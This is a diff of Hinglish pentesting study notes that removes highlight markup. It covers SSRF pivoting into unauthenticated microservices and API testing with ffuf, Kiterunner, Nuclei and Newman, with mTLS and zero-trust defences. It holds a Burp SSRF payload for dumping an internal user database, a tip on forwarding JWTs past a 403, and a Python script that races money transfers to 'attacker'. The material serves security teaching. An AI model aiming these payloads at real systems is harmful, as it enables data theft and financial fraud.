+5. Send dabao aur dekho kya internal service bina auth ke data de rahi hai.
 
-[[HL::#### 🔬 Attack Command (SSRF Pivoting via Burp Request)::HL]]
+#### 🔬 Attack Command (SSRF Pivoting via Burp Request)
 
-[[HL::```http::HL]]
-[[HL::# Burp Suite | HTTP Request Modification::HL]]
-[[HL::1  POST /api/v1/fetch_image HTTP/1.1             # Target ki external API::HL]]
-[[HL::2  Host: target.com::HL]]
+```http
+# Burp Suite | HTTP Request Modification
+1  POST /api/v1/fetch_image HTTP/1.1             # Target ki external API
+2  Host: target.com
 
-[[HL::3  Content-Type: application/json::HL]]
-[[HL::4  ::HL]]
-[[HL::5  {::HL]]
-[[HL::6    "image_url": "http://billing-service:8080/api/admin/dump_users"  # SSRF payload pointing to internal service::HL]]
-[[HL::7  }::HL]]
+3  Content-Type: application/json
+4  
+5  {
+6    "image_url": "http://billing-service:8080/api/admin/dump_users"  # SSRF payload pointing to internal service
+7  }
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output (In Burp Response):::HL]]
-[[HL::HTTP/1.1 200 OK::HL]]
-[[HL::Content-Type: application/json::HL]]
+```
+# 📤 Expected Output (In Burp Response):
+HTTP/1.1 200 OK
+Content-Type: application/json
 
-[[HL::{"status": "success", "data": [{"user": "admin", "card": "4111222233334444", "balance": "1000000"}]}::HL]]
+{"status": "success", "data": [{"user": "admin", "card": "4111222233334444", "balance": "1000000"}]}
 
-[[HL::```::HL]]
+```
 
-[[HL::*🔬 Code Explanation:*::HL]]
+*🔬 Code Explanation:*
 
-[[HL::* **Line 6:** `image_url` parameter usually external images load karne ke liye tha. Lekin humne yahan ek internal microservice ka URL daal diya (`billing-service`). Kyunki internal services ke beech **service-to-service authentication** nahi thi, billing service ne socha "yeh request toh image server se aayi hai, de do data". Yeh **SSRF pivoting** (SSRF ko bridge ki tarah use karke aage badhna) ka classic example hai.::HL]]
+* **Line 6:** `image_url` parameter usually external images load karne ke liye tha. Lekin humne yahan ek internal microservice ka URL daal diya (`billing-service`). Kyunki internal services ke beech **service-to-service authentication** nahi thi, billing service ne socha "yeh request toh image server se aayi hai, de do data". Yeh **SSRF pivoting** (SSRF ko bridge ki tarah use karke aage badhna) ka classic example hai.
 
-[[HL::### 🔒 8. Attack Surface & Defense (Dual Perspective)::HL]]
+### 🔒 8. Attack Surface & Defense (Dual Perspective)
 
-[[HL::**🔴 Attacker Perspective (Red Team):**::HL]]
+**🔴 Attacker Perspective (Red Team):**
 
-[[HL::* Attacker SSRF, LFI, ya Command Injection dhoondhta hai.::HL]]
-[[HL::* Us access ka use karke **internal APIs** discover karta hai.::HL]]
-[[HL::* Agar authentication nahi hai, toh attacker directly admin endpoints (`/delete`, `/shutdown`, `/dump`) hit karta hai internal services pe.::HL]]
+* Attacker SSRF, LFI, ya Command Injection dhoondhta hai.
+* Us access ka use karke **internal APIs** discover karta hai.
+* Agar authentication nahi hai, toh attacker directly admin endpoints (`/delete`, `/shutdown`, `/dump`) hit karta hai internal services pe.
 
-[[HL::**🔵 Defender Perspective (Blue Team):**::HL]]
+**🔵 Defender Perspective (Blue Team):**
 
-[[HL::* **Zero Trust Architecture** implement karo. Network boundaries (firewalls) par blindly trust mat karo.::HL]]
-[[HL::* **mTLS (Mutual TLS)** enforce karo. Har microservice communication encrypted honi chahiye aur identity certificates verify hone chahiye. API Gateway se aane wala traffic bhi token-based hona chahiye.::HL]]
+* **Zero Trust Architecture** implement karo. Network boundaries (firewalls) par blindly trust mat karo.
+* **mTLS (Mutual TLS)** enforce karo. Har microservice communication encrypted honi chahiye aur identity certificates verify hone chahiye. API Gateway se aane wala traffic bhi token-based hona chahiye.
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Cloud pentests (jaise Kubernetes environments) mein, developers aksar internal namespaces (jaise `kube-system` ya `backend-services`) mein authentication bypass kar dete hain testing ease ke liye. Ek external vulnerable web app (e.g., ek PDF generator module jisme SSRF hai) ka use karke, attacker `http://backend-db.default.svc.cluster.local:5984` (CouchDB default port) hit karke poora database bina password nikal leta hai.::HL]]
+Cloud pentests (jaise Kubernetes environments) mein, developers aksar internal namespaces (jaise `kube-system` ya `backend-services`) mein authentication bypass kar dete hain testing ease ke liye. Ek external vulnerable web app (e.g., ek PDF generator module jisme SSRF hai) ka use karke, attacker `http://backend-db.default.svc.cluster.local:5984` (CouchDB default port) hit karke poora database bina password nikal leta hai.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** SSRF milne par sirf `localhost` ya `127.0.0.1` try karke chhod dena.::HL]]
-[[HL::* **🤦 Why:** Beginners ko lagta hai SSRF sirf same server (loopback) pe kaam karta hai.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Modern apps microservices pe hoti hain. Fuzzing tools (ffuf/Intruder) use karke common internal hostnames (`api`, `backend`, `db`, `service`, `redis`) fuzz karo.::HL]]
-[[HL::* **⚡ Consequences:** Agar tumne lateral movement try nahi kiya, toh tum SSRF ka actual critical impact demonstrate nahi kar paoge.::HL]]
+* **❌ Mistake:** SSRF milne par sirf `localhost` ya `127.0.0.1` try karke chhod dena.
+* **🤦 Why:** Beginners ko lagta hai SSRF sirf same server (loopback) pe kaam karta hai.
+* **✅ The 'Pro' Way:** Modern apps microservices pe hoti hain. Fuzzing tools (ffuf/Intruder) use karke common internal hostnames (`api`, `backend`, `db`, `service`, `redis`) fuzz karo.
+* **⚡ Consequences:** Agar tumne lateral movement try nahi kiya, toh tum SSRF ka actual critical impact demonstrate nahi kar paoge.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-[[HL::* **Confusion 1 — "Microservice aur Monolithic app mein hack karne mein kya farq hai?"**::HL]]
-[[HL::* **Galat soch:** Dono ka hacking process same hai.::HL]]
-[[HL::* **Actually:** Monolithic app mein sab kuch ek hi server pe hota hai — ek shell mila, poora app tumhara. Microservices alag-alag machines/containers pe hoti hain. Ek service compromise hone se baaki bachi rehti hain *UNLESS* unke beech implicit trust (SSRF pivot) ho.::HL]]
-[[HL::* **Prove karo:** Kisi lab mein SSRF exploit karo. Monolithic mein `file:///etc/passwd` kaam karega. Microservices mein tumhe HTTP calls (`http://internal-service/admin`) karke dusre modules udane padenge.::HL]]
+* **Confusion 1 — "Microservice aur Monolithic app mein hack karne mein kya farq hai?"**
+* **Galat soch:** Dono ka hacking process same hai.
+* **Actually:** Monolithic app mein sab kuch ek hi server pe hota hai — ek shell mila, poora app tumhara. Microservices alag-alag machines/containers pe hoti hain. Ek service compromise hone se baaki bachi rehti hain *UNLESS* unke beech implicit trust (SSRF pivot) ho.
+* **Prove karo:** Kisi lab mein SSRF exploit karo. Monolithic mein `file:///etc/passwd` kaam karega. Microservices mein tumhe HTTP calls (`http://internal-service/admin`) karke dusre modules udane padenge.
 
 
-[[HL::* **Confusion 2 — "mTLS regular TLS/SSL (HTTPS) se alag kaise hai?"**::HL]]
-[[HL::* **Galat soch:** mTLS aur HTTPS bilkul same cheez hain.::HL]]
-[[HL::* **Actually:** Regular TLS mein sirf client verify karta hai ki server asli hai (jaise tum Google.com check karte ho). **mTLS (Mutual TLS)** mein server bhi client ka certificate check karta hai ("Tum kaun ho? Apna certificate dikhao"). Microservices mein dono endpoints ek dusre ko verify karte hain.::HL]]
-[[HL::* **Prove karo:** Burp Suite se mTLS enforced endpoint pe request bhejo. `400 Bad Request: No required SSL certificate was sent` aayega.::HL]]
+* **Confusion 2 — "mTLS regular TLS/SSL (HTTPS) se alag kaise hai?"**
+* **Galat soch:** mTLS aur HTTPS bilkul same cheez hain.
+* **Actually:** Regular TLS mein sirf client verify karta hai ki server asli hai (jaise tum Google.com check karte ho). **mTLS (Mutual TLS)** mein server bhi client ka certificate check karta hai ("Tum kaun ho? Apna certificate dikhao"). Microservices mein dono endpoints ek dusre ko verify karte hain.
+* **Prove karo:** Burp Suite se mTLS enforced endpoint pe request bhejo. `400 Bad Request: No required SSL certificate was sent` aayega.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`Error: Failed to connect to billing-service` (during SSRF)**::HL]]
-[[HL::* **Root Cause:** Ya toh hostname galat hai, ya service down hai, ya Network Policies (Kubernetes) traffic block kar rahi hain.::HL]]
-[[HL::* **Fix:** Ffuf se subdomains/internal hostnames ki list bruteforce karo.::HL]]
+* **`Error: Failed to connect to billing-service` (during SSRF)**
+* **Root Cause:** Ya toh hostname galat hai, ya service down hai, ya Network Policies (Kubernetes) traffic block kar rahi hain.
+* **Fix:** Ffuf se subdomains/internal hostnames ki list bruteforce karo.
 
 
-[[HL::* **`Error: 403 Forbidden` (on internal service hit)**::HL]]
-[[HL::* **Root Cause:** Implicit trust absent hai. Service actually authentication maang rahi hai (possibly service-to-service token enforced hai).::HL]]
-[[HL::* **Fix:** Original request (jisse SSRF mila) mein dekho kya koi JWT token hai, aur koshish karo ki wo token internal request mein forward ho jaye.::HL]]
+* **`Error: 403 Forbidden` (on internal service hit)**
+* **Root Cause:** Implicit trust absent hai. Service actually authentication maang rahi hai (possibly service-to-service token enforced hai).
+* **Fix:** Original request (jisse SSRF mila) mein dekho kya koi JWT token hai, aur koshish karo ki wo token internal request mein forward ho jaye.
 
 
 
-[[HL::### ⚖️ 13. Comparison (Zero Trust vs Implicit Trust)::HL]]
+### ⚖️ 13. Comparison (Zero Trust vs Implicit Trust)
 
-[[HL::| Feature | Implicit Trust (Vulnerable) | Zero Trust (Secure) |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Core Concept** | "Network ke andar sab safe hai" | "Network ke andar bhi verify karo" |::HL]]
-[[HL::| **Authentication** | Perimeter (API Gateway) pe hoti hai bas | Har single microservice pe hoti hai |::HL]]
-[[HL::| **SSRF Impact** | Critical — Full network compromise | Low — Internal service 401 Unauthorized degi |::HL]]
+| Feature | Implicit Trust (Vulnerable) | Zero Trust (Secure) |
+| --- | --- | --- |
+| **Core Concept** | "Network ke andar sab safe hai" | "Network ke andar bhi verify karo" |
+| **Authentication** | Perimeter (API Gateway) pe hoti hai bas | Har single microservice pe hoti hai |
+| **SSRF Impact** | Critical — Full network compromise | Low — Internal service 401 Unauthorized degi |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::* **⚔️ Attack Phase:** Post-Exploitation / Lateral Movement::HL]]
-[[HL::* **📍 Kill Chain Position:** Actions on Objective & Lateral Movement phase.::HL]]
-[[HL::* **🔗 This connects to:** Server-Side Request Forgery (SSRF), Container Escape.::HL]]
-[[HL::* **🔄 Flow:** Initial Access (Find SSRF on edge service) -> Discovery (Enumerate internal hostnames) -> Lateral Movement (Send payloads to internal unauth APIs) -> Exfiltration (Dump data).::HL]]
+* **⚔️ Attack Phase:** Post-Exploitation / Lateral Movement
+* **📍 Kill Chain Position:** Actions on Objective & Lateral Movement phase.
+* **🔗 This connects to:** Server-Side Request Forgery (SSRF), Container Escape.
+* **🔄 Flow:** Initial Access (Find SSRF on edge service) -> Discovery (Enumerate internal hostnames) -> Lateral Movement (Send payloads to internal unauth APIs) -> Exfiltration (Dump data).
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — Microservices SSRF Pivot)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — Microservices SSRF Pivot)
 
-[[HL::```text::HL]]
-[[HL::[External Attacker]::HL]]
-[[HL::       |::HL]]
-[[HL::  (SSRF Payload: url=http://internal-billing/dump)::HL]]
-[[HL::       V::HL]]
-[[HL::+-----------------------+           [Implicit Trust - No Auth Check]::HL]]
-[[HL::|   Edge API Gateway    |   -------------------------------------------> +-------------------------+::HL]]
-[[HL::| (Vulnerable to SSRF)  |   <------------------------------------------- | internal-billing-service|::HL]]
-[[HL::+-----------------------+      (Returns DB Dump)                         +-------------------------+::HL]]
-[[HL::       |::HL]]
-[[HL::  (Data Exfiltrated to Attacker)::HL]]
+```text
+[External Attacker]
+       |
+  (SSRF Payload: url=http://internal-billing/dump)
+       V
++-----------------------+           [Implicit Trust - No Auth Check]
+|   Edge API Gateway    |   -------------------------------------------> +-------------------------+
+| (Vulnerable to SSRF)  |   <------------------------------------------- | internal-billing-service|
++-----------------------+      (Returns DB Dump)                         +-------------------------+
+       |
+  (Data Exfiltrated to Attacker)
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q: Microservices architecture mein "Implicit Trust" ka attacker kaise fayda uthata hai?**::HL]]
-[[HL::* **A:** Implicit trust ka matlab hai internal services maan leti hain ki unke pas aane wali request safe hai kyunki wo internal network se aayi hai. Attacker edge service par SSRF dhoondhta hai aur usko proxy banakar internal services ko direct requests bhejta hai. Bina extra authentication checks ke, internal services admin actions execute kar deti hain.::HL]]
+* **Q: Microservices architecture mein "Implicit Trust" ka attacker kaise fayda uthata hai?**
+* **A:** Implicit trust ka matlab hai internal services maan leti hain ki unke pas aane wali request safe hai kyunki wo internal network se aayi hai. Attacker edge service par SSRF dhoondhta hai aur usko proxy banakar internal services ko direct requests bhejta hai. Bina extra authentication checks ke, internal services admin actions execute kar deti hain.
 
 
-[[HL::* **Q: Ek external app se internal network map (recon) karne ke liye SSRF kaise use karoge?**::HL]]
-[[HL::* **A:** Main SSRF vulnerable parameter mein common internal IPs (jaise `192.168.x.x`, `10.x.x.x`) aur ports (80, 8080, 6379, 5984) bruteforce karunga. Time delay (response aane mein kitna time laga) ya error messages dekh kar mujhe pata chal jayega kaunse internal microservices active hain.::HL]]
+* **Q: Ek external app se internal network map (recon) karne ke liye SSRF kaise use karoge?**
+* **A:** Main SSRF vulnerable parameter mein common internal IPs (jaise `192.168.x.x`, `10.x.x.x`) aur ports (80, 8080, 6379, 5984) bruteforce karunga. Time delay (response aane mein kitna time laga) ya error messages dekh kar mujhe pata chal jayega kaunse internal microservices active hain.
 
 
-[[HL::* **Q: Kya mTLS lagane se SSRF khatam ho jata hai?**::HL]]
-[[HL::* **A:** SSRF edge service se khatam nahi hota, lekin **lateral movement ruk jata hai**. Agar attacker SSRF se internal service hit karta hai, toh internal service client certificate maangegi, jo attacker ke proxy (edge service) ke paas nahi hoga (agar theek se configured ho). Request wahi drop ho jayegi.::HL]]
+* **Q: Kya mTLS lagane se SSRF khatam ho jata hai?**
+* **A:** SSRF edge service se khatam nahi hota, lekin **lateral movement ruk jata hai**. Agar attacker SSRF se internal service hit karta hai, toh internal service client certificate maangegi, jo attacker ke proxy (edge service) ke paas nahi hoga (agar theek se configured ho). Request wahi drop ho jayegi.
 
 
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::"Pardeh ke peeche sab dost hain = Implicit Trust = SSRF ka jackpot."::HL]]
+"Pardeh ke peeche sab dost hain = Implicit Trust = SSRF ka jackpot."
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — Microservices Communication Security::HL]]
-[[HL::✅ Covered    : Microservices, internal APIs, implicit trust, service-to-service authentication, mTLS, Mutual TLS, zero trust, API Gateway, internal routing, SSRF pivoting::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED     : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — Microservices Communication Security
+✅ Covered    : Microservices, internal APIs, implicit trust, service-to-service authentication, mTLS, Mutual TLS, zero trust, API Gateway, internal routing, SSRF pivoting
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED     : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### ✅ Topic Completion Checklist: Microservices Communication Security::HL]]
+### ✅ Topic Completion Checklist: Microservices Communication Security
 
-[[HL::* [x] Service-to-Service Auth::HL]]
-[[HL::* [x] mTLS Misconfigurations::HL]]
-[[HL::* [x] Implicit Trust::HL]]
+* [x] Service-to-Service Auth
+* [x] mTLS Misconfigurations
+* [x] Implicit Trust
 
-[[HL::> ✅ Verified by Notes Guru (Offensive Security Edition). 100% Subtopic Coverage + 100% Keyword Coverage.::HL]]
+> ✅ Verified by Notes Guru (Offensive Security Edition). 100% Subtopic Coverage + 100% Keyword Coverage.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🏁 FINAL GRAND CHECKLIST::HL]]
+### 🏁 FINAL GRAND CHECKLIST
 
-[[HL::* Total Sections: 1 ✅::HL]]
-[[HL::* Total Topics: 2 ✅::HL]]
-[[HL::* Total Subtopics: 6 ✅::HL]]
-[[HL::* Total Keywords: 21::HL]]
-[[HL::* Keywords Covered: 21 ✅::HL]]
-[[HL::* CVEs Covered: 0 ✅::HL]]
-[[HL::* Keywords Missed: 0::HL]]
+* Total Sections: 1 ✅
+* Total Topics: 2 ✅
+* Total Subtopics: 6 ✅
+* Total Keywords: 21
+* Keywords Covered: 21 ✅
+* CVEs Covered: 0 ✅
+* Keywords Missed: 0
 
-[[HL::> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har attack technique, har tool command. Koi bhi offensive security term censor nahi kiya gaya.::HL]]
+> ✅ Notes Guru (Offensive Security Edition) confirms: Yeh notes original skeleton ka 100% content cover karti hain — har topic, har subtopic, har keyword, har attack technique, har tool command. Koi bhi offensive security term censor nahi kiya gaya.
 
-[[HL::━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━::HL]]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-[[HL::==================================================================================::HL]]
+==================================================================================
 
-[[HL::# Section 17: Professional Pentesting & Reporting::HL]]
+# Section 17: Professional Pentesting & Reporting
 
 
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 1. CLI & Scripting for APIs::HL]]
+### 🎯 1. CLI & Scripting for APIs
 
-[[HL::Is topic mein hum seekhenge ki API testing ko command-line tools (CLI) aur custom Python scripts ke through kaise automate aur scale kiya jata hai taaki humara pentesting workflow fast aur efficient bane.::HL]]
+Is topic mein hum seekhenge ki API testing ko command-line tools (CLI) aur custom Python scripts ke through kaise automate aur scale kiya jata hai taaki humara pentesting workflow fast aur efficient bane.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-[[HL::Socho tum ek factory mein kaam karte ho jahan tum haath se ek-ek khilauna bana rahe ho (GUI tools jaise Postman/Burp Suite use karna). Yeh learning ke liye accha hai, par jab tumhe din ke 10,000 khilaune check karne hon, toh tumhe ek automated assembly line chahiye. **CLI tools aur scripting** wahi assembly line hain — yeh tumhare haath se kiye gaye kaam ko seconds mein hazaron baar repeat kar sakte hain bina thake.::HL]]
+Socho tum ek factory mein kaam karte ho jahan tum haath se ek-ek khilauna bana rahe ho (GUI tools jaise Postman/Burp Suite use karna). Yeh learning ke liye accha hai, par jab tumhe din ke 10,000 khilaune check karne hon, toh tumhe ek automated assembly line chahiye. **CLI tools aur scripting** wahi assembly line hain — yeh tumhare haath se kiye gaye kaam ko seconds mein hazaron baar repeat kar sakte hain bina thake.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** CLI (Command Line Interface) scripting and automation involve using terminal-based tools and programming languages to programmatically execute security tests, perform rapid fuzzing, and seamlessly integrate into continuous testing pipelines (CI/CD).::HL]]
-[[HL::* **Hinglish Simplification:** Apne terminal aur scripts (jaise Python) ko use karke API requests ko automatically aur bohot tezi se bhejna, taaki bugs jaldi milen.::HL]]
+* **Precise English:** CLI (Command Line Interface) scripting and automation involve using terminal-based tools and programming languages to programmatically execute security tests, perform rapid fuzzing, and seamlessly integrate into continuous testing pipelines (CI/CD).
+* **Hinglish Simplification:** Apne terminal aur scripts (jaise Python) ko use karke API requests ko automatically aur bohot tezi se bhejna, taaki bugs jaldi milen.
 
-[[HL::### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)::HL]]
+### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)
 
-[[HL::* **Problem:** GUI tools mein manual testing slow hoti hai. Agar ek API mein 500 endpoints hain, toh sabko manually test karne mein hafte lag jayenge.::HL]]
-[[HL::* **Solution:** Automation se hum hazaron requests kuch minutes mein bhej sakte hain, aur specific misconfigurations ko rapidly dhoondh sakte hain.::HL]]
-[[HL::* **What breaks if we don't know this?** Real engagement ya bug bounty mein dusre hackers aapse pehle bug dhoondh lenge kyunki unki speed zyada hogi.::HL]]
-[[HL::* **✅ Kab use karo (Use in engagement when):** Jab large scope ho, jab endpoints discover karne hon (fuzzing), ya jab CI/CD pipeline integration (development phase mein hi security testing automate karna) karni ho.::HL]]
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Jab complex, multi-step business logic test karna ho jismein har step pe human intuition chahiye — tab Burp Suite Repeater/Postman GUI better hai.
+* **Problem:** GUI tools mein manual testing slow hoti hai. Agar ek API mein 500 endpoints hain, toh sabko manually test karne mein hafte lag jayenge.
+* **Solution:** Automation se hum hazaron requests kuch minutes mein bhej sakte hain, aur specific misconfigurations ko rapidly dhoondh sakte hain.
+* **What breaks if we don't know this?** Real engagement ya bug bounty mein dusre hackers aapse pehle bug dhoondh lenge kyunki unki speed zyada hogi.
+* **✅ Kab use karo (Use in engagement when):** Jab large scope ho, jab endpoints discover karne hon (fuzzing), ya jab CI/CD pipeline integration (development phase mein hi security testing automate karna) karni ho.
+* **❌ Kab mat karo / Alternative prefer karo:** Jab complex, multi-step business logic test karna ho jismein har step pe human intuition chahiye — tab Burp Suite Repeater/Postman GUI better hai.
 
-[[HL::### 🔍 5. Visual / Terminal Mein Kya Dikhega::HL]]
+### 🔍 5. Visual / Terminal Mein Kya Dikhega
 
-[[HL::Terminal screen tezi se scroll hogi jismein green `[200 OK]` aur red `[403 Forbidden]` status codes dikhenge, aur Nuclei ke case mein clearly formatted vulnerabilities list hongi.::HL]]
+Terminal screen tezi se scroll hogi jismein green `[200 OK]` aur red `[403 Forbidden]` status codes dikhenge, aur Nuclei ke case mein clearly formatted vulnerabilities list hongi.
 
-[[HL::### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)::HL]]
+### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)
 
-[[HL::(1) **Input List Preparation:** Attacker ek wordlist aur target URL prepare karta hai.::HL]]
-[[HL::(2) **CLI Tool Execution:** Tool (jaise ffuf) concurrent threads spawn karta hai aur multiple HTTP requests ek saath target API par bhejta hai.::HL]]
-[[HL::(3) **Response Parsing:** Tool server ke responses (Status codes, length, words) ko analyze karta hai aur anomalies (jaise hidden endpoints) filter karke output deta hai.::HL]]
+(1) **Input List Preparation:** Attacker ek wordlist aur target URL prepare karta hai.
+(2) **CLI Tool Execution:** Tool (jaise ffuf) concurrent threads spawn karta hai aur multiple HTTP requests ek saath target API par bhejta hai.
+(3) **Response Parsing:** Tool server ke responses (Status codes, length, words) ko analyze karta hai aur anomalies (jaise hidden endpoints) filter karke output deta hai.
 
-[[HL::### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)::HL]]
+### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)
 
-[[HL::**1. API Endpoint Fuzzing with Ffuf:**::HL]]
+**1. API Endpoint Fuzzing with Ffuf:**
 
-[[HL::```bash::HL]]
-[[HL::# Linux | Ffuf 2.0+::HL]]
-[[HL::1  ffuf -w words.txt -u https://api.target.com/FUZZ  # ffuf = web fuzzer tool; -w = wordlist file path; words.txt = words ki list; -u = target URL; FUZZ = keyword jahan ffuf wordlist ke words inject karega::HL]]
+```bash
+# Linux | Ffuf 2.0+
+1  ffuf -w words.txt -u https://api.target.com/FUZZ  # ffuf = web fuzzer tool; -w = wordlist file path; words.txt = words ki list; -u = target URL; FUZZ = keyword jahan ffuf wordlist ke words inject karega
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output:::HL]]
-[[HL::api                     [Status: 200, Size: 312, Words: 45, Lines: 12]::HL]]
-[[HL::v1                      [Status: 200, Size: 1045, Words: 120, Lines: 45]::HL]]
-[[HL::admin                   [Status: 403, Size: 56, Words: 3, Lines: 1]::HL]]
+```
+# 📤 Expected Output:
+api                     [Status: 200, Size: 312, Words: 45, Lines: 12]
+v1                      [Status: 200, Size: 1045, Words: 120, Lines: 45]
+admin                   [Status: 403, Size: 56, Words: 3, Lines: 1]
 
-[[HL::```::HL]]
+```
 
-[[HL::**2. API Route Discovery with Kiterunner:**::HL]]
+**2. API Route Discovery with Kiterunner:**
 
-[[HL::```bash::HL]]
-[[HL::# Linux | Kiterunner (kr) 1.0+::HL]]
-[[HL::1  kr scan https://api.target.com/ -w routes.kite  # kr = kiterunner (API-specific discovery tool); scan = scanning mode; -w = compiled kiterunner wordlist (JSON/Swagger structures pe based hoti hai)::HL]]
+```bash
+# Linux | Kiterunner (kr) 1.0+
+1  kr scan https://api.target.com/ -w routes.kite  # kr = kiterunner (API-specific discovery tool); scan = scanning mode; -w = compiled kiterunner wordlist (JSON/Swagger structures pe based hoti hai)
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output:::HL]]
-[[HL::200 [GET]     https://api.target.com/api/v1/users/::HL]]
-[[HL::401 [POST]    https://api.target.com/api/v1/admin/config::HL]]
+```
+# 📤 Expected Output:
+200 [GET]     https://api.target.com/api/v1/users/
+401 [POST]    https://api.target.com/api/v1/admin/config
 
-[[HL::```::HL]]
+```
 
-[[HL::**3. Misconfiguration Scanning with Nuclei:**::HL]]
+**3. Misconfiguration Scanning with Nuclei:**
 
-[[HL::```bash::HL]]
-[[HL::# Linux | Nuclei 3.0+::HL]]
-[[HL::1  nuclei -u https://api.target.com -t http/misconfiguration/api/  # nuclei = vulnerability scanner based on YAML templates; -u = target URL; -t = specific YAML templates ka folder run karo (jaise API misconfigs ke liye)::HL]]
+```bash
+# Linux | Nuclei 3.0+
+1  nuclei -u https://api.target.com -t http/misconfiguration/api/  # nuclei = vulnerability scanner based on YAML templates; -u = target URL; -t = specific YAML templates ka folder run karo (jaise API misconfigs ke liye)
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output:::HL]]
-[[HL::[swagger-api] [http] [info] https://api.target.com/api/swagger-ui.html::HL]]
-[[HL::[exposed-graphql] [http] [high] https://api.target.com/graphql::HL]]
+```
+# 📤 Expected Output:
+[swagger-api] [http] [info] https://api.target.com/api/swagger-ui.html
+[exposed-graphql] [http] [high] https://api.target.com/graphql
 
-[[HL::```::HL]]
+```
 
-[[HL::**4. Running Postman Collections in CLI with Newman:**::HL]]
+**4. Running Postman Collections in CLI with Newman:**
 
-[[HL::```bash::HL]]
-[[HL::# Linux/Windows | Newman (Node.js)::HL]]
-[[HL::1  newman run postman_collection.json -e environment.json  # newman = Postman ka CLI runner; run = execute command; postman_collection.json = exported API requests; -e environment.json = variables ki file (jaise {{token}})::HL]]
+```bash
+# Linux/Windows | Newman (Node.js)
+1  newman run postman_collection.json -e environment.json  # newman = Postman ka CLI runner; run = execute command; postman_collection.json = exported API requests; -e environment.json = variables ki file (jaise {{token}})
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output:::HL]]
-[[HL::→ GET https://api.target.com/users [200 OK, 150ms]::HL]]
-[[HL::  ✓ Status code is 200::HL]]
+```
+# 📤 Expected Output:
+→ GET https://api.target.com/users [200 OK, 150ms]
+  ✓ Status code is 200
 
-[[HL::```::HL]]
+```
 
-[[HL::**5. Custom Python Exploitation Script:**::HL]]
+**5. Custom Python Exploitation Script:**
 
-[[HL::```python::HL]]
-[[HL::# Python 3.8+ | requests library::HL]]
-[[HL::1  import requests  # requests = Python mein HTTP requests bhejne ki library::HL]]
-[[HL::2  url = "https://api.target.com/transfer"::HL]]
-[[HL::3  headers = {"Authorization": "Bearer token123"}::HL]]
-[[HL::4  data = {"to": "attacker", "amount": 1000}::HL]]
-[[HL::5  # Race condition test ke liye jaldi se multiple requests bhejna::HL]]
-[[HL::6  for _ in range(10):::HL]]
-[[HL::7      requests.post(url, headers=headers, json=data)  # loop mein POST request bhej rahe hain::HL]]
+```python
+# Python 3.8+ | requests library
+1  import requests  # requests = Python mein HTTP requests bhejne ki library
+2  url = "https://api.target.com/transfer"
+3  headers = {"Authorization": "Bearer token123"}
+4  data = {"to": "attacker", "amount": 1000}
+5  # Race condition test ke liye jaldi se multiple requests bhejna
+6  for _ in range(10):
+7      requests.post(url, headers=headers, json=data)  # loop mein POST request bhej rahe hain
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output: (Koi visible terminal output nahi, server pe actions execute honge)::HL]]
+```
+# 📤 Expected Output: (Koi visible terminal output nahi, server pe actions execute honge)
 
-[[HL::```::HL]]
+```
 
